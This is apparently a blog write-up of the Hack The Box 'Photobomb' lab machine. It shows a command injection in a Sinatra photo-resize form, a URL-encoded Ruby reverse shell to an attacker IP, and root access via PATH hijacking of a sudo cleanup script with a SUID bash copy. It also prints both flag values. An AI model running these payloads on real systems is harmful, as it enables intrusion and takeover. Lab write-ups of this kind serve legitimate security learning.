---
title: "HTB: Photobomb"
date: 2023-01-11T14:15:25+08:00
draft: false
author: "Jack Sun"
tags:
  - CTFs
  - Writeups
  - HackTheBox
  - Cybersecurity
image: /images/writeups/HTB/photobomb/banner.png
---

## Description

- 20 pts, Easy
- Written by `slartibartfast`

## User Flag

First thing first, add an entry to the `/etc/hosts` file with

```sh
echo "<ip address> photobomb.htb" >> /etc/hosts
```

Running nmap on the domain, we can see that there are 2 ports exposed:

- Web server on port 80
- SSH on 22

![nmap](/images/writeups/HTB/photobomb/nmap.png)

Checking out the web server on port 80, we are greeted with the website for a photo printing service called Photobomb.

![Click Here](/images/writeups/HTB/photobomb/index.png)

There is a link called `click here!` on the website, which points to another webpage. However this route is protected by a login form.

![Login](/images/writeups/HTB/photobomb/login.png)

Without the credentials, we are greeted with a `401` NGINX error page.

Checking out the the source code, we find a javascript file called `photobomb.js` containing the following:

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

From this, we find the tech support credentials: `pH0t0:b0Mb!`, which we can manually enter into the login form or use the url `http://pH0t0:b0Mb!@photobomb.htb/` to automatically authenticate ourselves.

Unfortunately, I note here that the tech support credentials do not work for the SSH service that we found earlier through the nmap scan.

Anyways, now that have the tech support logins, we can navigate to the `/printer` route. Upon inspection, there is a download form at the bottom that allows for the selected image to be resized and downloaded.

Let's fire up Burp Suite and intercept that download request!

![Burp](/images/writeups/HTB/photobomb/burp.png)

We can see that the request uses the `POST` method. The URL encoded form data contains 3 parameters:

- `photo`
- `filetype`
- `dimensions`

I initially tried to manipulate the `photo` parameter in hopes of getting some form of path traversal or arbitrary file read, however, this proved unsuccessful.

I noted that if I sent a blank request, the server would return a debug page.

![blank_request](/images/writeups/HTB/photobomb/blank_request.png)

![error](/images/writeups/HTB/photobomb/error.png)

From this, I was able to determine that the server is running the Sinatra Ruby framework. I then tried searching for CVEs related to Sinatra to no success.

After sending the request to Burp Repeater and fuzzing all the parameters, I noticed that the server was returning a `500` error code when certain characters such as `'`, `"`, `$`, `;` were added after jpg in the `filetype` parameter. This could be an indication of a Remote Code Execution vulnerability.

This hypothesis can be tested by sending a test URL encoded payload such as `jpg;sleep%20100` on the filetype parameter. After sending the payload, we can see that the request takes a long time to complete, eventually timing out, thus confirming that our payload is being executed on the server and that a Remote Code Execution vulnerability exists.

Next, we will try to pop a reverse shell on the server so we can capture the user flag. I went to [revshells.com](https://www.revshells.com/) and tried a few payloads. Of course, we must URL Encode the payload as we are sending it as a form parameter. The `Ruby #1` payload seemed to work in this instance:

```ruby
ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.XX.XX.XX%22%2C4444%29%29%27
```

After starting a reverse shell listener on my machine, I sent the payload to the server and after a while, I caught a reverse shell. Running `whoami`, we can see that we have taken over the account of `wizard`.

![whoami](/images/writeups/HTB/photobomb/whoami.png)

Next we can upgrade the shell to a TTY with python. `python -c 'import pty; pty.spawn("/bin/bash")'` complained that python was not installed. I tried again with `python3` and it worked.

![upgrade](/images/writeups/HTB/photobomb/upgrade.png)

After changing into the home directory via `cd ~`, we find a file called `user.txt` containing the user flag.

![user flag](/images/writeups/HTB/photobomb/userflag.png)

User flag: `c2b4e704eecdabe4cba7c012ce9c8fe6`

## Root Flag

Running `sudo -l`, we see that `wizard` can run a peculiar script `/opt/cleanup.sh` as root without a password.

! [sudo](/images/writeups/HTB/photobomb/sudo.png)

Catting out the contents of the script gives us the following:

```sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Immediately, I noticed that `find` is not called explicitly with its full path like the other commands. This is vulnerable to a `PATH` variable manipulation attack. We can inject a malicious path into the PATH variable before `/usr/bin` containing a malicious script called `find`. Then, when we execute `/opt/cleanup.sh`, it will execute our malicious `find` script instead of the original `find` program in `/usr/bin`.

Inside `/tmp/find`, we can write a simple script to install a privileged bash shell with the SUID bit set in `/tmp` and then run `/opt/cleanup.sh`. I have adapted the installation command from [GTFO Bin](https://gtfobins.github.io/gtfobins/bash/#suid) as below for our purposes:

```sh
install -m =xs $(which bash) /tmp/bash
```

After doing so, we give the script execute permission with `chmod +x ./find`. We can now run `sudo PATH=/tmp:$PATH /opt/cleanup.sh`, which will in turn execute our malicious script.

![install](/images/writeups/HTB/photobomb/install.png)

We can now spawn a root bash shell with `/tmp/bash -p`. Running `whoami` confirms that we are root.

![root](/images/writeups/HTB/photobomb/root.png)

Next, we can navigate to `/root` and capture the root flag.

![root flag](/images/writeups/HTB/photobomb/rootflag.png)

Root flag: `899b78ed71f3a29a23df770acc5ce2fa`
